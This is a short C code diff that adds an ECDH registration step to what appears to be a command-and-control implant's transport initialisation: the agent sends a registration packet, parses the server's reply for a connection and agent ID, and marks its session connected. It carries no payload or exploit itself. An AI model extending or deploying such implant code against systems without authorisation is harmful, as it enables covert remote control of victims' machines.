@@ -18,6 +18,35 @@ BOOL TransportInit( )
     SIZE_T Size    = 0;
     BOOL   Success = FALSE;
 
+#ifdef ARCHON_ECDH_MODE
+    /* ECDH registration: send the pre-built registration packet and parse the
+     * response to obtain the connection_id and confirm the session key.
+     * This path short-circuits the legacy AES-CTR PackageTransmitNow path. */
+    if ( Instance->ECDH.RegPacket && Instance->ECDH.RegPacketLen > 0 ) {
+        PVOID  RespData  = NULL;
+        SIZE_T RespSize  = 0;
+        UINT8  ConnId[16];
+        UINT32 AgentId   = 0;
+
+        MemSet( ConnId, 0, sizeof( ConnId ) );
+
+        if ( TransportSend( Instance->ECDH.RegPacket, Instance->ECDH.RegPacketLen,
+                            &RespData, &RespSize ) ) {
+            if ( RespData && RespSize >= (SIZE_T)ECDH_REG_RESP_MIN &&
+                 ecdh_parse_registration_response(
+                     Instance->ECDH.SessionKey,
+                     (const ei_u8 *)RespData, (ei_size_t)RespSize,
+                     ConnId, &AgentId ) ) {
+                MemCopy( Instance->ECDH.ConnectionId, ConnId, 16 );
+                Instance->ECDH.Active       = TRUE;
+                Instance->Session.Connected = TRUE;
+                Success = TRUE;
+            }
+        }
+        return Success;
+    }
+#endif
+
     /* Sends to our connection (direct/pivot) */
 #ifdef TRANSPORT_HTTP
     if ( PackageTransmitNow( Instance->MetaData, &Data, &Size ) )
